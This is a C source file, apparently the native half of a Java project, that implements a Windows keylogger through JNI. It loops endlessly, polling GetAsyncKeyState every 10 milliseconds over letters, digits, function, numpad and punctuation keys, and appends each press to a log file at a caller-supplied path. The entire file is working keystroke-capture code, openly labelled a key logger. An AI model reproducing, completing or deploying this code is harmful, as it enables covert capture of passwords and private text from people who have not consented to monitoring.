#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include "com_wassilak_win_kl_kl_PollingKL.h"

/*
 * The SLEEP_TIME_MILLIS constant defines how often the key logger polls the
 * keyboard.
 */
#define SLEEP_TIME_MILLIS 10

/*
 * The KEY_DOWN_INDICATOR constant defines the return value of
 * GetAsyncKeyState that indicates a key being pressed.
 */
#define KEY_DOWN_INDICATOR -32767

/*
 * The nativeRun function is an implementation of a polling key logger. It polls
 * a set of keys on the keyboard at a set interval. Currently it works like a
 * charm but it's a mess. At some point it will probably be a little more
 * broken up and maintainable.
 *
 * @param javaString Contains the full file path to write the captured keys to.
 */
JNIEXPORT void JNICALL Java_com_wassilak_win_1kl_kl_PollingKL_nativeRun
    (JNIEnv *env, jobject obj, jstring javaString) {

    /*
     * The logFilePath string contains the file to write logged keys to.
     */
    const char *logFilePath = (*env)->GetStringUTFChars(env, javaString, 0);

    /*
     * The keys array defines the key's to be polled. It is defined explicitly
     * rather than iterating over a range for reasons of efficiency.
     */
    int keys[] = {
        VK_BACK, VK_TAB, VK_RETURN, VK_SHIFT, VK_CONTROL, VK_MENU, VK_PAUSE,
        VK_CAPITAL, VK_ESCAPE, VK_SPACE, VK_PRIOR, VK_NEXT, VK_END, VK_HOME,
        VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_SNAPSHOT, VK_INSERT, VK_DELETE,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42,
        0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
        0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        VK_LWIN, VK_RWIN, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3,
        VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
        VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE,
        VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10,
        VK_F11, VK_F12, VK_NUMLOCK, VK_SCROLL, VK_OEM_1, VK_OEM_PLUS,
        VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3,
        VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7
    };

    /*
     * The i integer is an iterator used to iterate through the keys array.
     */
    int i;
    while(TRUE) {
        Sleep(SLEEP_TIME_MILLIS);
        for(i = 0; i < (sizeof(keys) / sizeof(int)); i++) {
            if(GetAsyncKeyState(keys[i]) == KEY_DOWN_INDICATOR) {
                FILE *logFile;
                logFile = fopen(logFilePath, "a+");
                if(logFile != NULL) {
                    switch(keys[i]) {
                        case VK_BACK:
                            fputs("[BACKSPACE]", logFile);
                            break;
                        case VK_TAB:
                            fputs("[TAB]", logFile);
                            break;
                        case VK_RETURN:
                            fputs("[ENTER]", logFile);
                            break;
                        case VK_SHIFT:
                            fputs("[SHIFT]", logFile);
                            break;
                        case VK_CONTROL:
                            fputs("[CTRL]", logFile);
                            break;
                        case VK_MENU:
                            fputs("[ALT]", logFile);
                            break;
                        case VK_PAUSE:
                            fputs("[PAUSE]", logFile);
                            break;
                        case VK_CAPITAL:
                            fputs("[CAPS_LOCK]", logFile);
                            break;
                        case VK_ESCAPE:
                            fputs("[ESCAPE]", logFile);
                            break;
                        case VK_SPACE:
                            fputs("[SPACE]", logFile);
                            break;
                        case VK_PRIOR:
                            fputs("[PAGE_UP]", logFile);
                            break;
                        case VK_NEXT:
                            fputs("[PAGE_DOWN]", logFile);
                            break;
                        case VK_END:
                            fputs("[END]", logFile);
                            break;
                        case VK_HOME:
                            fputs("[HOME]", logFile);
                            break;
                        case VK_LEFT:
                            fputs("[LEFT_ARROW]", logFile);
                            break;
                        case VK_UP:
                            fputs("[UP_ARROW]", logFile);
                            break;
                        case VK_RIGHT:
                            fputs("[RIGHT_ARROW]", logFile);
                            break;
                        case VK_DOWN:
                            fputs("[DOWN_ARROW]", logFile);
                            break;
                        case VK_SNAPSHOT:
                            fputs("[PRINT_SCREEN]", logFile);
                            break;
                        case VK_INSERT:
                            fputs("[INSERT]", logFile);
                            break;
                        case VK_DELETE:
                            fputs("[DELETE]", logFile);
                            break;
                        case 0x30:
                            fputc('0', logFile);
                            break;
                        case 0x31:
                            fputc('1', logFile);
                            break;
                        case 0x32:
                            fputc('2', logFile);
                            break;
                        case 0x33:
                            fputc('3', logFile);
                            break;
                        case 0x34:
                            fputc('4', logFile);
                            break;
                        case 0x35:
                            fputc('5', logFile);
                            break;
                        case 0x36:
                            fputc('6', logFile);
                            break;
                        case 0x37:
                            fputc('7', logFile);
                            break;
                        case 0x38:
                            fputc('8', logFile);
                            break;
                        case 0x39:
                            fputc('9', logFile);
                            break;
                        case 0x41:
                            fputc('A', logFile);
                            break;
                        case 0x42:
                            fputc('B', logFile);
                            break;
                        case 0x43:
                            fputc('C', logFile);
                            break;
                        case 0x44:
                            fputc('D', logFile);
                            break;
                        case 0x45:
                            fputc('E', logFile);
                            break;
                        case 0x46:
                            fputc('F', logFile);
                            break;
                        case 0x47:
                            fputc('G', logFile);
                            break;
                        case 0x48:
                            fputc('H', logFile);
                            break;
                        case 0x49:
                            fputc('I', logFile);
                            break;
                        case 0x4A:
                            fputc('J', logFile);
                            break;
                        case 0x4B:
                            fputc('K', logFile);
                            break;
                        case 0x4C:
                            fputc('L', logFile);
                            break;
                        case 0x4D:
                            fputc('M', logFile);
                            break;
                        case 0x4E:
                            fputc('N', logFile);
                            break;
                        case 0x4F:
                            fputc('O', logFile);
                            break;
                        case 0x50:
                            fputc('P', logFile);
                            break;
                        case 0x51:
                            fputc('Q', logFile);
                            break;
                        case 0x52:
                            fputc('R', logFile);
                            break;
                        case 0x53:
                            fputc('S', logFile);
                            break;
                        case 0x54:
                            fputc('T', logFile);
                            break;
                        case 0x55:
                            fputc('U', logFile);
                            break;
                        case 0x56:
                            fputc('V', logFile);
                            break;
                        case 0x57:
                            fputc('W', logFile);
                            break;
                        case 0x58:
                            fputc('X', logFile);
                            break;
                        case 0x59:
                            fputc('Y', logFile);
                            break;
                        case 0x5A:
                            fputc('Z', logFile);
                            break;
                        case VK_LWIN:
                            fputs("[LEFT_WIN]", logFile);
                            break;
                        case VK_RWIN:
                            fputs("[RIGHT_WIN]", logFile);
                            break;
                        case VK_NUMPAD0:
                            fputs("[NUMPAD_0]", logFile);
                            break;
                        case VK_NUMPAD1:
                            fputs("[NUMPAD_1]", logFile);
                            break;
                        case VK_NUMPAD2:
                            fputs("[NUMPAD_2]", logFile);
                            break;
                        case VK_NUMPAD3:
                            fputs("[NUMPAD_3]", logFile);
                            break;
                        case VK_NUMPAD4:
                            fputs("[NUMPAD_4]", logFile);
                            break;
                        case VK_NUMPAD5:
                            fputs("[NUMPAD_5]", logFile);
                            break;
                        case VK_NUMPAD6:
                            fputs("[NUMPAD_6]", logFile);
                            break;
                        case VK_NUMPAD7:
                            fputs("[NUMPAD_7]", logFile);
                            break;
                        case VK_NUMPAD8:
                            fputs("[NUMPAD_8]", logFile);
                            break;
                        case VK_NUMPAD9:
                            fputs("[NUMPAD_9]", logFile);
                            break;
                        case VK_MULTIPLY:
                            fputs("[MULTIPLY]", logFile);
                            break;
                        case VK_ADD:
                            fputs("[ADD]", logFile);
                            break;
                        case VK_SEPARATOR:
                            fputs("[SEPARATOR]", logFile);
                            break;
                        case VK_SUBTRACT:
                            fputs("[SUBTRACT]", logFile);
                            break;
                        case VK_DECIMAL:
                            fputs("[DECIMAL]", logFile);
                            break;
                        case VK_DIVIDE:
                            fputs("[DIVIDE]", logFile);
                            break;
                        case VK_F1:
                            fputs("[F1]", logFile);
                            break;
                        case VK_F2:
                            fputs("[F2]", logFile);
                            break;
                        case VK_F3:
                            fputs("[F3]", logFile);
                            break;
                        case VK_F4:
                            fputs("[F4]", logFile);
                            break;
                        case VK_F5:
                            fputs("[F5]", logFile);
                            break;
                        case VK_F6:
                            fputs("[F6]", logFile);
                            break;
                        case VK_F7:
                            fputs("[F7]", logFile);
                            break;
                        case VK_F8:
                            fputs("[F8]", logFile);
                            break;
                        case VK_F9:
                            fputs("[F9]", logFile);
                            break;
                        case VK_F10:
                            fputs("[F10]", logFile);
                            break;
                        case VK_F11:
                            fputs("[F11]", logFile);
                            break;
                        case VK_F12:
                            fputs("[F12]", logFile);
                            break;
                        case VK_NUMLOCK:
                            fputs("[NUM_LOCK]", logFile);
                            break;
                        case VK_SCROLL:
                            fputs("[SCROLL_LOCK]", logFile);
                            break;
                        case VK_OEM_1:
                            fputs("[COLON_SEMICOLON]", logFile);
                            break;
                        case VK_OEM_PLUS:
                            fputs("[PLUS]", logFile);
                            break;
                        case VK_OEM_COMMA:
                            fputs("[COMMA]", logFile);
                            break;
                        case VK_OEM_MINUS:
                            fputs("[MINUS]", logFile);
                            break;
                        case VK_OEM_PERIOD:
                            fputs("[PERIOD]", logFile);
                            break;
                        case VK_OEM_2:
                            fputs("[SLASH_QUESTION]", logFile);
                            break;
                        case VK_OEM_3:
                            fputs("[GRAVE_TILDE]", logFile);
                            break;
                        case VK_OEM_4:
                            fputs("[OPEN_BRACKET_BRACE]", logFile);
                            break;
                        case VK_OEM_5:
                            fputs("[BACKSLASH_PIPE]", logFile);
                            break;
                        case VK_OEM_6:
                            fputs("[CLOSE_BRACKET_BRACE]", logFile);
                            break;
                        case VK_OEM_7:
                            fputs("[SINGLE_DOUBLE_QUOTE]", logFile);
                            break;
                    }
                    fclose(logFile);
                }
            }
        }
    }
}
